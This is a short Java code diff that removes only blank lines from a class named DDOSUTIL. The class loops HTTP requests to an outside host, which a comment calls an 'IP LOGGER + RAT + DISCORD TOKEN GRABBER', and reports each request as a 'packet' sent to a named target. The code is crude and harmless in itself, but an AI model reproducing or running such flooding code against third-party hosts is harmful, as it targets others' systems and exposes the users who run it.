@@ -18,15 +18,9 @@ public class DDOSUTIL {
        int n = 2;
         // for loop
         for (int i = 1; i <= n; ++i) {
-
-
-
             URL url = new URL("http://helium.tecness.lol");  // IP LOGGER + RAT + DISCORD TOKEN GRABBER 🙄
-
             HttpURLConnection huc = (HttpURLConnection) url.openConnection();
-
             int responseCode = huc.getResponseCode();
-
             ChatHelper.printMessage(String.valueOf("Sent packet to tecness house with code " + responseCode));
        }
 
